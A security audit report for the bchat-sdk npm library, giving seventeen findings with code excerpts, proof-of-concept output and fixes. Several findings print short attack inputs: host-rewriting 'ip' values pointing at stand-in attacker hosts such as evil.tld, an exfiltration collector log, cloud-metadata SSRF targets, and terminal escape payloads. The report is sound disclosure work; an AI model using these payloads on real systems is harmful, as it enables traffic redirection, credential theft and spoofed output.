# Security Audit — bchat-sdk v0.1.0

**Date:** 2026-08-16
**Scope:** `src/`, `examples/`, `scripts/`, build and packaging config, dependency tree
**Threat model:** published npm library. Untrusted parties are (a) the network path, (b) seed nodes, (c) storage nodes, (d) message senders. The library owner's own machine is trusted.
**Method:** manual source review of all 4,551 LOC, plus working proof-of-concept exploits run against the compiled code for findings 01, 02, 04, 05, 06, 08, 09 and 10.

---

## Summary

| ID | Severity | Finding |
|----|----------|---------|
| [BCHAT-01](#bchat-01) | **Critical** | TLS verification is silently disabled on any certificate error, even when `insecureTls` is false |
| [BCHAT-02](#bchat-02) | **Critical** | Request URL is built from an unvalidated, attacker-supplied `ip` field — SSRF and request redirection |
| [BCHAT-03](#bchat-03) | **High** | Storage nodes are never cryptographically authenticated; `pubkey_x25519` / `pubkey_ed25519` are carried but unused |
| [BCHAT-04](#bchat-04) | **High** | `senderWalletAddress` is self-attested and freely spoofable despite passing signature verification |
| [BCHAT-05](#bchat-05) | Medium | No replay or freshness protection on decrypted messages |
| [BCHAT-06](#bchat-06) | Medium | `FileStore` writes decrypted message plaintext with world-readable permissions |
| [BCHAT-07](#bchat-07) | Medium | Recovery phrase and API bearer token are accepted as command-line arguments |
| [BCHAT-08](#bchat-08) | Medium | `mode: 0o600` is ignored when the identity file already exists |
| [BCHAT-09](#bchat-09) | Medium | Unbounded memory and disk growth from attacker-controlled input |
| [BCHAT-10](#bchat-10) | Medium | Message bodies are rendered to the terminal without stripping escape sequences |
| [BCHAT-11](#bchat-11) | Low | Payloads that fail to decrypt are persisted as if they were message bodies |
| [BCHAT-12](#bchat-12) | Low | Replay guard is in-memory only and is bypassed by messages without a `hash` |
| [BCHAT-13](#bchat-13) | Low | Certificate "pinning" in `SeedNodeClient` is a no-op |
| [BCHAT-14](#bchat-14) | Low | Seed node URL scheme is not validated — `http://` is silently accepted |
| [BCHAT-15](#bchat-15) | Low | API example echoes internal error messages to unauthenticated-adjacent clients |
| [BCHAT-16](#bchat-16) | Low | A store is reported as successful on any HTTP 200 |
| [BCHAT-17](#bchat-17) | Info | No forward secrecy; `FileStore` key collisions; unreachable legacy-mnemonic path; redirects followed |

**Clean:** `npm audit` reports 0 vulnerabilities across 387 packages. The published tarball contains only `dist/` and `README.md` — no identity files leak on publish. Git history contains no committed secrets. Base58, keccak, varint, protobuf and padding codecs are bounds-checked and rejected malformed input under review. Key derivation uses `sodium.randombytes_buf` (a CSPRNG) and correctly derives X25519 from Ed25519. `FileStore.pathFor` correctly prevents path traversal. The API example's bearer check is correctly constant-time.

The two Critical findings compound: **01** removes transport confidentiality and **02** lets a single malicious storage node choose where the SDK sends its next request. Together they mean any party on the network path, or any node in the pool, can silently observe and redirect all of a user's traffic. Message *bodies* stay confidential (sealed boxes protect them end-to-end), but the metadata that BChat exists to protect — who is talking to whom, and when — does not.

---

## Critical

<a name="bchat-01"></a>
### BCHAT-01 — TLS verification silently disabled on any certificate error

**Severity:** Critical · **CWE-295** (Improper Certificate Validation) · `src/snode/bchatRpc.ts:110-129`

When a strict-TLS request to a storage node fails with anything matching `CERT_ERROR_PATTERN`, `BchatRpc` retries the same request with `rejectUnauthorized: false`, caches the node as "self-signed", and uses the unverified agent for every subsequent request to it. This happens **regardless of the `insecureTls` option** — the fallback is unconditional in the default configuration.

```ts
// src/snode/bchatRpc.ts:115-127
if (
  this.agent?.options.rejectUnauthorized !== false &&   // true when insecureTls is unset
  CERT_ERROR_PATTERN.test(e?.message || '')
) {
  this.selfSigned.add(nodeKey);
  this.logger.warn(`snode ${nodeKey} serves a self-signed certificate; ...`);
  return await doFetch(this.getInsecureAgent());        // <-- unverified, silently
}
```

An attacker who can intercept traffic (hostile Wi-Fi, malicious ISP, BGP hijack, compromised VPN) presents any self-signed certificate. The TLS handshake fails, the SDK downgrades, and the attacker now terminates the connection. Because storage node identity keys are never checked either ([BCHAT-03](#bchat-03)), there is no second line of defence.

The attacker cannot read message bodies — those are sealed boxes — but gains the full social graph: which pubkeys are being polled, which recipients are being written to, message sizes, and timing. For a privacy-focused messenger this is the primary asset. The attacker can also drop or reorder messages, serve a stale `last_hash` to force mailbox replay, and answer swarm lookups with poisoned data to chain into [BCHAT-02](#bchat-02).

Note that `SeedNodeClient` gets this right — it only downgrades when `insecureTls` is explicitly set (`src/seed/SeedNodeClient.ts:172`). `BchatRpc` should match that behaviour.

**Verified.** Against a locally-run HTTPS server with a self-signed certificate, constructed with `insecureTls` unset:

```
snode 127.0.0.1:8443 serves a self-signed certificate; using an unverified connection to it
>>> SUCCEEDED against SELF-SIGNED cert with insecureTls=false: 200 {"messages":[],"last_hash":""}
```

The rogue server received the full `retrieve` RPC including the account pubkey.

**Remediation.** Delete the automatic fallback. Gate it on `insecureTls` exactly as `SeedNodeClient` does:

```ts
// src/snode/bchatRpc.ts — replace the retry body
return retry(async () => {
  // insecureTls already selects the unverified agent in the constructor;
  // there is no per-node downgrade path.
  return await doFetch();
}, { /* ... */ });
```

If storage nodes genuinely require self-signed certificates for the network to function, that is an *authentication* problem, not a verification-off problem — fix it with [BCHAT-03](#bchat-03) (pin the node's `pubkey_ed25519`) rather than by accepting any certificate. Until that lands, requiring callers to opt in via `insecureTls: true` at least makes the exposure visible and auditable.

---

<a name="bchat-02"></a>
### BCHAT-02 — Request URL built from an unvalidated attacker-supplied `ip`

**Severity:** Critical · **CWE-918** (SSRF), **CWE-20** · `src/snode/bchatRpc.ts:59`, `src/snode/SnodeClient.ts:137-146`, `src/seed/SeedNodeClient.ts:189-196`

`BchatRpc.call` interpolates `targetNode.ip` straight into a URL string:

```ts
// src/snode/bchatRpc.ts:59
const url = `https://${targetNode.ip}:${targetNode.port}/storage_rpc/v1`;
```

`targetNode.ip` originates from a `get_mnodes_for_pubkey` response returned by a storage node, or `public_ip` from a seed node. Neither is validated beyond `n?.ip && n.ip !== '0.0.0.0'` — there is no check that it is an IP address at all. A value containing `/`, `?` or `@` rewrites the host, path and query of the request.

Two distinct impacts:

1. **Request redirection.** `ip = "attacker.tld/collect?x="` produces `https://attacker.tld/collect?x=:443/storage_rpc/v1` — the request, including the caller's pubkey and their Ed25519-signed `retrieve` authentication material, goes to a host of the attacker's choosing on a path of their choosing. `ip = "user:pass@evil.tld"` also resolves to `evil.tld`.
2. **SSRF.** `ip = "127.0.0.1"` or `"169.254.169.254"` makes the SDK issue attacker-shaped POSTs to loopback services or the cloud instance metadata endpoint. For a server-side bot — the stated use case in the README — this reaches services that trust localhost.

`node-fetch` also follows redirects by default (no `redirect` option is set anywhere in `src/`), giving a second hop even for a well-formed `ip`.

**Verified.** With a rogue storage node returning `{mnodes:[{ip:'127.0.0.1:9443/exfil?ignored=', port:1, ...}]}`, a separate collector on port 9443 received:

```
[ATTACKER COLLECTOR] got POST /exfil?ignored=:1/storage_rpc/v1
[ATTACKER COLLECTOR] body: {"jsonrpc":"2.0","id":"0","method":"retrieve",
                            "params":{"pubKey":"bdaaaa…","lastHash":""}}
```

The retrieve request was delivered to a host, port and path entirely under the malicious node's control.

**Remediation.** Validate at the trust boundary and construct the URL with the `URL` API rather than string interpolation.

```ts
// src/snode/validate.ts (new)
import net from 'net';

const PRIVATE_V4 =
  /^(0\.|10\.|127\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|22[4-9]\.|2[3-5]\d\.)/;

export function assertPublicSnodeAddress(ip: string, port: unknown): number {
  if (net.isIP(ip) !== 4 && net.isIP(ip) !== 6) {
    throw new Error(`snode ip is not a literal IP address: ${JSON.stringify(ip)}`);
  }
  if (net.isIP(ip) === 4 && PRIVATE_V4.test(ip)) {
    throw new Error(`snode ip is not publicly routable: ${ip}`);
  }
  if (net.isIP(ip) === 6 && /^(::1$|fe80:|fc|fd)/i.test(ip)) {
    throw new Error(`snode ip is not publicly routable: ${ip}`);
  }
  const p = Number(port);
  if (!Number.isInteger(p) || p < 1 || p > 65535) {
    throw new Error(`snode port is invalid: ${String(port)}`);
  }
  return p;
}
```

Apply it in both places node lists are parsed (`SnodeClient.resolveSwarm`, `SeedNodeClient.tryOne`) by filtering out entries that fail, and again defensively in `BchatRpc.call`. Then build the URL safely:

```ts
// src/snode/bchatRpc.ts
const port = assertPublicSnodeAddress(targetNode.ip, targetNode.port);
const u = new URL('https://placeholder/storage_rpc/v1');
u.hostname = targetNode.ip.includes(':') ? `[${targetNode.ip}]` : targetNode.ip;
u.port = String(port);
const url = u.toString();
```

Also pass `redirect: 'error'` to every `fetch` call in `bchatRpc.ts` and `SeedNodeClient.ts`. A storage node has no legitimate reason to redirect a JSON-RPC POST.

---

## High

<a name="bchat-03"></a>
### BCHAT-03 — Storage nodes are never cryptographically authenticated

**Severity:** High · **CWE-306** · `src/types.ts:3-8`, `src/snode/SnodeClient.ts:141-146`, `src/seed/SeedNodeClient.ts:189-196`

Every `Snode` carries `pubkey_x25519` and `pubkey_ed25519`, and the SDK plumbs them from seed responses through swarm responses into the `Snode` objects — but a grep across `src/` shows they are **never read** for any verification purpose. The only consumer of a `pubkey_ed25519` field is the SDK's *own* outgoing signature parameter (`SnodeClient.ts:419`).

Consequently the SDK has no way to tell a real storage node from an impostor. TLS is the only authentication in play, and [BCHAT-01](#bchat-01) removes that. This is the root cause that makes 01 and 02 exploitable rather than merely untidy, and it is also why the README's "onion routing is not implemented" note is more consequential than it reads: without onion routing *and* without node authentication, the transport offers no integrity guarantee above raw TCP.

**Remediation.** Two layers, in order of effort:

1. **Short term** — treat the node's `pubkey_ed25519` as a pin. Storage node RPC responses in the Session/Oxen family are signed by the node; verify that signature against the `pubkey_ed25519` the seed announced, and reject responses that do not verify. This authenticates the node regardless of what certificate it serves and makes [BCHAT-01](#bchat-01)'s self-signed certificates a non-issue.
2. **Longer term** — implement the onion request path. `Transport` already exists as the extension point (`src/transport/Transport.ts`), so this is additive rather than a rewrite.

Until one of these lands, the README's threat-model section should state plainly that the SDK provides end-to-end message confidentiality but **no metadata privacy against a network observer**.

---

<a name="bchat-04"></a>
### BCHAT-04 — `senderWalletAddress` is self-attested and spoofable

**Severity:** High · **CWE-290** (Authentication Bypass by Spoofing) · `src/protocol/BchatProtocolEncryption.ts:117-120, 187-188`

The signature over an incoming message covers `walletAddress ‖ paddedContent ‖ senderEdPub ‖ recipientPub` and is verified against `senderEdPub` — so `senderBchatId` is genuinely authenticated. The wallet address is *inside* the signed region, which reads as though it were authenticated too, and `DecryptedEnvelope.senderWalletAddress` is documented as "the sender's Beldex wallet address".

But the sender signs their own claim. Nothing binds the wallet address to the Ed25519 identity. Both derive from the same 32-byte seed (`identity.ts:67-71`), and that derivation is one-way: given only `senderEdPub`, a recipient cannot recompute the expected wallet address. A sender is therefore free to embed *any* 97-character string.

This matters because BChat pairs messaging with a wallet. Any consumer that surfaces `senderWalletAddress` as "pay this person here" — a tipping bot, a payment-request flow, an invoice parser — can be induced to pay an attacker. The message will show a correct, verified sender ID next to a wallet address belonging to someone else, which is a more convincing lure than a plain phishing message.

**Verified.** Mallory sends Bob a message carrying the victim's wallet address:

```
signature verified & accepted : true
authenticated sender id       : bdfeb5e1b95153…   (Mallory's real ID)
reported senderWalletAddress  : bxdF4FbDSwTLpoeH…
victim's wallet address       : bxdF4FbDSwTLpoeH…   <-- match
mallory's REAL wallet address : bxdEoJRSJXvKxKui…
>>> spoofed wallet accepted   : true
```

**Remediation.** The protocol field cannot be made trustworthy without a wire change, so fix the *documentation and API shape* so consumers cannot mistake it for verified data. Rename it and mark it unverified:

```ts
// src/types.ts
export type DecryptedEnvelope = {
  /** sender ID ('bd' + 64 hex) — cryptographically authenticated by the payload signature */
  senderBchatId: string;
  /**
   * UNVERIFIED. The wallet address the sender *claims*, carried in the payload.
   * The signature is made by the sender over their own claim, and nothing binds
   * this string to `senderBchatId`. Never use it as a payment destination
   * without out-of-band confirmation.
   */
  unverifiedSenderWalletAddress?: string;
  // ...
};
```

Propagate the rename through `BchatProtocolEncryption.decryptEnvelope`, `SnodeClient.decryptMessage` (`SnodeClient.ts:355`) and `examples/api/server.ts`. Add the same warning to the README's protocol section. If a future protocol revision is possible, the durable fix is for the sender to sign the wallet address with the wallet's *spend key* and include that second signature.

---

## Medium

<a name="bchat-05"></a>
### BCHAT-05 — No replay or freshness protection on decrypted messages

**Severity:** Medium · **CWE-294** · `src/protocol/BchatProtocolEncryption.ts:140-207`

`decryptEnvelope` extracts `envelope.timestamp` and `dataMessage.timestamp` and returns them, but never checks either against the current time or against previously-seen messages. A byte-identical payload verifies successfully every time it is presented.

`SnodeClient` has a de-duplication set (`seen`, `SnodeClient.ts:286-294`), but it keys on the snode-assigned `hash`, not on message content, is in-memory only, and is bypassed entirely by messages that arrive without a hash ([BCHAT-12](#bchat-12)). A malicious storage node — or a network attacker, given [BCHAT-01](#bchat-01) — can re-serve a captured payload under a fresh hash and it will be accepted and displayed as new. "Yes, go ahead" replayed at the wrong moment is a real attack in a chat context.

**Verified.** Presenting the identical ciphertext twice to `decryptEnvelope` returned a valid result both times.

**Remediation.** Reject messages outside a bounded window, and de-duplicate on content rather than on the transport's hash:

```ts
// src/protocol/BchatProtocolEncryption.ts
const MAX_CLOCK_SKEW_MS = 15 * 60 * 1000;   // accept up to 15 min of skew
const MAX_MESSAGE_AGE_MS = 14 * 24 * 60 * 60 * 1000;  // matches the store TTL

// after signature verification, before returning:
const ts = envelope.timestamp;
const age = Date.now() - ts;
if (!Number.isFinite(ts) || age > MAX_MESSAGE_AGE_MS || age < -MAX_CLOCK_SKEW_MS) {
  return null;
}
```

Then key the de-duplication set on `sodium.crypto_generichash(32, envelope.content)` instead of `m.hash`, so a re-served payload is caught no matter what hash the snode attaches. Persist that set through `Persistence` so it survives a restart.

---

<a name="bchat-06"></a>
### BCHAT-06 — Decrypted message cache is world-readable

**Severity:** Medium · **CWE-276** (Incorrect Default Permissions) · `src/persistence/FileStore.ts:80-87`

`FileStore.write` calls `fs.mkdir` and `fs.writeFile` with no `mode`, so the results are subject to the process umask. Under the default `umask 022` this produces mode `0644` files inside a `0755` directory. Those files hold `body` — the decrypted plaintext of every message received — plus the retrieval cursor.

Any other local user, and any process running as another account on the same host, can read the user's entire message history. On a shared server or a multi-tenant CI box this is the whole conversation. The CLI (`bchat-sdk receive`) and both examples enable `FileStore` by default, so this is the default path, not an edge case.

The identity files elsewhere in the codebase *are* written `0600` (`cli.ts:107`, `server.ts:126`, `chat.ts:111`), which shows the intent — `FileStore` was just missed.

**Verified.** Under `umask 022`, `fs.writeFile(path, data, 'utf8')` yields `file mode 644, dir mode 755`.

**Remediation.**

```ts
// src/persistence/FileStore.ts
private async write(pubKey: string, data: any): Promise<void> {
  const file = this.pathFor(pubKey);
  await fs.mkdir(resolve(this.baseDir), { recursive: true, mode: 0o700 });
  const tmp = `${file}.${process.pid}.${randomBytes(6).toString('hex')}.tmp`;
  await fs.writeFile(tmp, JSON.stringify(data, null, 2), { encoding: 'utf8', mode: 0o600 });
  await fs.chmod(tmp, 0o600);   // mode is ignored if tmp somehow already exists
  await fs.rename(tmp, file);
}
```

`mkdir`'s `mode` is only applied to directories it creates, so also `chmod` the base directory to `0700` on first use if it already existed. Adding `randomBytes` to the temp filename additionally closes a symlink/collision race between two processes sharing a PID namespace.

---

<a name="bchat-07"></a>
### BCHAT-07 — Secrets accepted as command-line arguments

**Severity:** Medium · **CWE-214** (Invocation of Process Using Visible Sensitive Information) · `src/cli.ts:97`, `examples/api/server.ts:58`

Two secrets are exposed on `argv`:

- `bchat-sdk create-account --mnemonic "<25 words>"` — the recovery phrase, which is the *entire* identity and wallet.
- `bchat-api --token <secret>` — the API bearer token.

Process arguments are readable by any local user via `ps aux` or `/proc/<pid>/cmdline` for the lifetime of the process, and are written verbatim into shell history (`~/.bash_history`, `~/.zsh_history`) where they persist indefinitely. The chat example's error message actively teaches the insecure invocation (`chat.ts:101`).

**Remediation.** Read both from stdin or the environment, and keep the flag only as a deprecated alias that prints a warning.

```ts
// src/cli.ts
.option('--mnemonic-stdin', 'read the 25-word phrase from stdin (preferred)')
.option('--mnemonic <phrase>', 'DEPRECATED: visible in `ps` and shell history')

const readMnemonic = async (opts: any): Promise<string | undefined> => {
  if (opts.mnemonicStdin) {
    const chunks: Buffer[] = [];
    for await (const c of process.stdin) chunks.push(c as Buffer);
    return Buffer.concat(chunks).toString('utf8').trim();
  }
  if (process.env.BCHAT_MNEMONIC) return process.env.BCHAT_MNEMONIC.trim();
  if (opts.mnemonic) {
    console.error('warning: --mnemonic is visible to other users via `ps` and is ' +
                  'recorded in your shell history. Prefer --mnemonic-stdin.');
    return opts.mnemonic;
  }
  return undefined;
};
```

For the API example, prefer `process.env.BCHAT_API_TOKEN` over `--token`. Update `chat.ts:101` to suggest the stdin form.

---

<a name="bchat-08"></a>
### BCHAT-08 — `mode: 0o600` is ignored when the identity file already exists

**Severity:** Medium · **CWE-276** · `src/cli.ts:107`, `examples/api/server.ts:126`, `examples/chat/chat.ts:111`

All three identity writers pass `{ mode: 0o600 }` to `writeFileSync`. That mode is only applied by the `open(2)` call when the file is **created**. Writing over a file that already exists leaves its existing permissions untouched.

So `bchat-sdk create-account -o account.json` run twice, or run against a path the user pre-created (`touch account.json`, or a file restored from a backup, or one produced by an earlier version), silently writes the recovery phrase into a mode-`0644` file. The code reads as though it guarantees `0600`; it does not.

**Verified.**

```
existing file after writeFileSync(mode:0600): 644
new file after writeFileSync(mode:0600)     : 600
```

**Remediation.** Create with `wx` and an explicit `chmod`, and refuse to clobber:

```ts
import { openSync, writeFileSync, closeSync, chmodSync } from 'fs';

function writeSecretFile(path: string, contents: string) {
  let fd: number;
  try {
    fd = openSync(path, 'wx', 0o600);   // fails if it already exists
  } catch (e: any) {
    if (e.code === 'EEXIST') {
      throw new Error(`${path} already exists — refusing to overwrite an identity file`);
    }
    throw e;
  }
  try {
    writeFileSync(fd, contents, 'utf8');
    chmodSync(path, 0o600);
  } finally {
    closeSync(fd);
  }
}
```

Apply in all three call sites.

---

<a name="bchat-09"></a>
### BCHAT-09 — Unbounded memory and disk growth from attacker-controlled input

**Severity:** Medium · **CWE-770** (Allocation Without Limits) · multiple

Four unbounded sinks, all fed by parties outside the trust boundary:

1. **HTTP response bodies.** No `size` option is passed to `node-fetch` anywhere in `src/`, and `node-fetch` v3 defaults to unlimited. A malicious or MITM'd seed/storage node can stream an arbitrarily large body into `res.text()` / `res.json()` and exhaust the heap. Combined with [BCHAT-01](#bchat-01), any network attacker can do this.
2. **`FileStore.appendMessages`** (`FileStore.ts:53-60`) reads the whole file, concatenates, and rewrites it on every poll. The array never shrinks. Beyond unbounded disk use this is O(n²) in total I/O — a long-lived bot degrades steadily and then stalls.
3. **`inbox` in the API example** (`server.ts:106`, `225-236`) grows forever; `GET /messages/history` then serialises the whole thing into one response.
4. **`swarms` / `pinned` / `seen` maps in `SnodeClient`** are keyed by pubkey with no eviction. `seen` has a per-key cap (`SEEN_HASH_LIMIT`), but the number of *keys* is unbounded — a service polling many mailboxes leaks a map entry per pubkey forever.

Anyone who knows a target's BChat ID can drive 1 and 2 by sending messages; storage nodes are public, so this needs no privileged position.

**Remediation.**

```ts
// src/snode/bchatRpc.ts and src/seed/SeedNodeClient.ts — cap every response
const MAX_RESPONSE_BYTES = 5 * 1024 * 1024;
const r = await this.fetch(url, {
  method: 'POST',
  size: MAX_RESPONSE_BYTES,   // node-fetch: rejects with FetchError past this
  redirect: 'error',
  // ...
});
```

For `FileStore`, cap the retained history and document it:

```ts
// src/persistence/FileStore.ts
const MAX_RETAINED_MESSAGES = 5_000;

async appendMessages(pubKey: string, messages: MessageRecord[]): Promise<void> {
  if (!messages.length) return;
  return this.enqueue(pubKey, async () => {
    const data = await this.read(pubKey);
    const merged = [...(data.messages || []), ...messages];
    data.messages = merged.slice(-MAX_RETAINED_MESSAGES);
    await this.write(pubKey, data);
  });
}
```

For the API example, bound `inbox` the same way and paginate `/messages/history`. For `SnodeClient`, evict `swarms` / `pinned` / `seen` entries for pubkeys not touched in the last N minutes.

---

<a name="bchat-10"></a>
### BCHAT-10 — Message bodies rendered to the terminal without escaping

**Severity:** Medium · **CWE-150** (Improper Neutralization of Escape Sequences) · `examples/chat/chat.ts:314-318`

`renderIncoming` interpolates `message.plaintext` and `message.displayName` directly into a `process.stdout.write`. Neither is sanitised. Message bodies are arbitrary UTF-8 chosen by the sender.

An attacker embeds ANSI control sequences to erase the line, repaint the transcript, and impersonate the client's own system messages — the chat UI renders its own output in the same colour codes the attacker can emit, so a forged `· system: …` line is indistinguishable from a real one. `ESC]0;…BEL` rewrites the window title. On terminals with OSC 52 enabled (iTerm2, some VTE builds, Kitty), `ESC]52;c;<base64>BEL` writes to the system clipboard — so the next thing the user pastes into a shell is attacker-chosen.

**Verified.** A message body containing `\x1b[2K\r\x1b[32m· system: …\x1b[0m\x1b]0;pwned\x07` survived encryption, signature verification and decryption byte-for-byte, arriving at the render path with raw `0x1b` intact.

**Remediation.** Strip C0/C1 control characters from every remote string before display:

```ts
// examples/chat/chat.ts
// Keep tab and newline; drop everything else in C0/C1, including ESC.
const sanitize = (s: string) =>
  s.replace(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/g, '\uFFFD');

function renderIncoming(message: any) {
  // ...
  const label = message.displayName
    ? `${sanitize(message.displayName)} (${shortId(from)})`
    : shortId(from);
  write(`${dim(`[${clockOf(at)}]`)} ${cyan(label)} ${sanitize(message.plaintext)}`);
}
```

Consider also truncating `displayName` to a fixed width — an 8 KB display name is its own denial of readability. The API example is unaffected: it emits JSON, and `JSON.stringify` escapes control characters.

---

## Low

<a name="bchat-11"></a>
### BCHAT-11 — Undecryptable payloads persisted as message bodies

**Severity:** Low · `src/snode/SnodeClient.ts:307-313`

When decryption fails, `decryptMessage` returns the raw message unchanged (`SnodeClient.ts:350, 366`) — correct, since one forged message must not abort the batch. But the persistence layer then writes:

```ts
body: m?.plaintext ?? m?.data,
```

so for any message that did not decrypt, `body` is the raw base64 blob supplied by an unauthenticated third party. `GET /messages/history` in the API example serves that field to clients, which will reasonably treat `body` as message text. Anyone can write arbitrary content into a target's mailbox — no relationship is required.

**Remediation.** Keep the fields distinct and let consumers opt in:

```ts
await this.persistence.appendMessages(pubKey, results.map((m: any) => ({
  hash: m?.hash,
  body: m?.plaintext,            // undefined when decryption failed
  raw: m?.data,
  decrypted: m?.plaintext !== undefined,
  receivedAt: Date.now(),
})));
```

Update `MessageRecord` in `src/persistence/Store.ts` accordingly.

---

<a name="bchat-12"></a>
### BCHAT-12 — Replay guard is in-memory and bypassable

**Severity:** Low · `src/snode/SnodeClient.ts:286-294`

Two gaps in the de-duplication set:

- A message whose `hash` is absent or non-string is passed through unconditionally (`if (typeof hash !== 'string' || !hash) return true;`). A malicious node simply omits the field.
- The set lives only in the `SnodeClient` instance. Every restart re-admits everything the snode chooses to re-serve, and `FileStore` will happily append the duplicates again.

**Remediation.** Fold into the [BCHAT-05](#bchat-05) fix: de-duplicate on a content hash, and persist the set via `Persistence`.

---

<a name="bchat-13"></a>
### BCHAT-13 — Certificate pinning in `SeedNodeClient` is a no-op

**Severity:** Low · `src/seed/SeedNodeClient.ts:85-92`

The pinned bundle is concatenated with `tls.rootCertificates`:

```ts
ca: [...pinnedCa, ...tls.rootCertificates],
```

Any certificate chaining to any of the ~150 public roots is therefore accepted, and the three pinned entries add nothing. They are also all the *same* expired cross-signed ISRG Root X1 (`storageSeed3Crt` and `publicBeldexFoundationCtr` are assignments of `storageSeed1Crt`, lines 57-58).

This is knowingly documented in the code comment and in the README, and appending the system store is the right call versus breaking all seed traffic — so this is a correctness/clarity issue, not an exploitable one. But the code currently reads like it pins when it does not.

**Remediation.** Either drop the dead bundle and the three constants entirely (roughly 35 lines), or implement real pinning via `checkServerIdentity` against a current SPKI hash:

```ts
import { createHash } from 'crypto';
const PINNED_SPKI = new Set(['<base64 sha256 of the seed node SPKI>']);

new https.Agent({
  rejectUnauthorized: true,
  checkServerIdentity: (host, cert) => {
    const spki = createHash('sha256').update(cert.pubkey).digest('base64');
    if (!PINNED_SPKI.has(spki)) return new Error(`seed ${host}: SPKI not pinned`);
    return undefined;
  },
});
```

Real pinning needs a rotation plan; dropping the dead code is the honest minimum.

---

<a name="bchat-14"></a>
### BCHAT-14 — Seed node URL scheme not validated

**Severity:** Low · `src/seed/SeedNodeClient.ts:69-72, 126`

`seedNodes` entries flow into `new URL('json_rpc', seedUrl)` with no scheme check. `http://…` is accepted silently, sending the discovery request in cleartext and letting any observer replace the entire snode pool. `--seeds` in both examples is a comma-split of raw user input with no validation either.

**Remediation.**

```ts
// src/seed/SeedNodeClient.ts, in the constructor
this.seedNodes = opts.seedNodes.map(raw => {
  const u = new URL(raw);
  if (u.protocol !== 'https:' && !opts.insecureTls) {
    throw new Error(`seed node ${raw} must use https (or set insecureTls)`);
  }
  return u.toString();
});
```

---

<a name="bchat-15"></a>
### BCHAT-15 — API example echoes internal error messages

**Severity:** Low · **CWE-209** · `examples/api/server.ts:330`

```ts
return fail(res, 500, e?.message || 'internal error');
```

Errors from the SDK carry internal detail — snode IPs and ports, filesystem paths from `FileStore`, and Node error strings. These reach any client holding the bearer token, and become part of whatever that client logs.

**Remediation.** Log the detail server-side, return an opaque identifier:

```ts
} catch (e: any) {
  const ref = randomBytes(6).toString('hex');
  logger.error(`request failed [${ref}]:`, e?.stack || e?.message || e);
  return fail(res, 500, `internal error (ref ${ref})`);
}
```

---

<a name="bchat-16"></a>
### BCHAT-16 — Store reported successful on any HTTP 200

**Severity:** Low · `src/snode/SnodeClient.ts:216-217`

```ts
if (parsed?.hash) return parsed.hash as string;
if (parsed?.status === 'OK' || res.status === 200) return true;
```

A node that returns `200` with an empty or unrelated body is treated as a successful store, and `storeMessage` returns before trying the other two swarm members. A misbehaving or malicious node therefore silently blackholes messages while the sender's UI reports success. The comment explains the intent (tolerate non-JSON bodies from healthy nodes), but the rule is too permissive.

**Remediation.** Require a positive signal, and count successes across nodes rather than returning on the first:

```ts
const ok = parsed?.hash ? String(parsed.hash)
         : parsed?.status === 'OK' ? true
         : undefined;
if (ok !== undefined) { successes.push(ok); }
// after the loop:
if (!successes.length) throw lastError || new Error('store failed on all snodes');
return successes[0]!;
```

Storing on all of `DEFAULT_CONNECTIONS` rather than stopping at the first success also matches how swarm replication is meant to work.

---

<a name="bchat-17"></a>
### BCHAT-17 — Informational

**No forward secrecy.** `crypto_box_seal` is anonymous-sender X25519 to a long-term recipient key (`encryption.ts:48`, `BchatProtocolEncryption.ts:121`). Compromise of a recovery phrase decrypts every message ever sent to that ID, including any an adversary recorded earlier. This is inherent to the BChat/Session envelope format and not a defect in this SDK, but it belongs in the README's security notes so consumers can reason about key-compromise impact.

**`FileStore` key collisions.** `pathFor` maps every character outside `[A-Za-z0-9_-]` to `_` (`FileStore.ts:20`). Two distinct pubkey strings — for example `bd<hex>` and `bd:<hex>` — collide onto one file, mixing two mailboxes. Path traversal *is* correctly prevented; this is a correctness edge. Hashing the key (`sha256(pubKey).hex()`) removes both concerns at once.

**Unreachable legacy-mnemonic path.** `identityFromMnemonic` zero-pads seeds shorter than 32 bytes for 13-word phrase compatibility (`identity.ts:62-64`), but `mnDecode` rejects anything under 25 words (`mnemonic.ts:59`), so the branch cannot be reached. Either drop it or lower the word-count floor deliberately — note that zero-padding a 16-byte seed to 32 bytes yields a 128-bit-entropy identity, so if the branch is ever enabled it should be documented as such.

**Redirects followed.** No `redirect` option is set on any `fetch` call, so `node-fetch` follows up to 20 redirects. Covered by the [BCHAT-02](#bchat-02) remediation (`redirect: 'error'`), noted here so it is not lost if that fix is scoped down.

---

## Recommended order of work

1. **BCHAT-01** and **BCHAT-02** — both are small, self-contained diffs in `bchatRpc.ts` and close remote attacks available to any network observer.
2. **BCHAT-06**, **BCHAT-08** — one-line permission fixes protecting keys and plaintext at rest.
3. **BCHAT-04** — API rename plus README warning; cheap, and prevents a payment-redirection class of bug in every downstream consumer.
4. **BCHAT-09**, **BCHAT-05**, **BCHAT-10** — hardening against hostile input.
5. **BCHAT-03** — the largest piece of work and the durable fix for the transport's trust model. Worth scheduling deliberately rather than rushing.

Add regression tests alongside each fix; the existing `src/**/__tests__` layout and vitest setup already cover the relevant modules, so each of these has a natural home. Two worth writing first: a test asserting `BchatRpc` *rejects* a self-signed certificate when `insecureTls` is unset, and a test asserting a swarm response containing `ip: "evil.tld/x?"` is discarded.

---

*Reviewed against commit `0688a98` ("Add HTTP API example and tighten cache gitignore"). Findings 01, 02, 04, 05, 06, 08, 09 and 10 were confirmed with executable proofs of concept against the compiled sources; the remainder are from source review.*
